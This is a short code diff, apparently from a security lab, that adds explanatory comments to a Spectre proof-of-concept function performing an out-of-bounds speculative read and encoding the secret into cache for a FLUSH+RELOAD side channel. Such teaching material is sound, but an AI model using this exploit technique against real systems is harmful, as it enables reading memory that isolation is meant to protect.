@@ -92,8 +92,11 @@ void spectreAttack(size_t larger_x) {
         _mm_clflush(&array[i].dat);
     }
 
-    //speculative access
+    //speculative access, it works because the CPU will predect that we send the correct size, so it will return the element.
     s = restrictedAccess(larger_x);  // Out-of-bounds speculative read
+
+    // then we access its element in the array.
+    // so we will be able to perform FLUSH + RELOAD attack, from which we will be able to extract the correct letter.
     array[s].dat += 1;               // Encode secret into cache
 }
 
